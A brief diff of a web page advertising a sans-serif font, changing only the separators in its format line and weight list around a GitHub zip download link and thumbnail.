@@ -5,8 +5,8 @@ A casual modern <a href="https://github.com/qp5/FONT/raw/main/FONT.zip">Sans fon
 
 <a href="https://github.com/qp5/FONT/raw/main/FONT.zip"><img style="height: 280px; margin-bottom:-0px; margin-top:0px;" src="https://bowhip.org/img/font_thumb_publisher_card.png" alt="mobile calling application"></a> 
 
-Sans Typeface TTF | Woff2 (new website font) <br>
-<span style="color: gray;">ExtLght, Light, Regular, SemiBold, Condensed SemiBold, Bold, Black, Outliners</span><br>
+Sans Typeface TTF & Woff2 (new website font) <br>
+<span style="color: gray;">ExtLght | Light | Regular | SemiBold | Condensed | SemiBold | Bold | Black | Outliners</span><br>
 <br>
 
 Join this <a href="mailto: support@bowhip.org">font project➚</a> <br> <br>
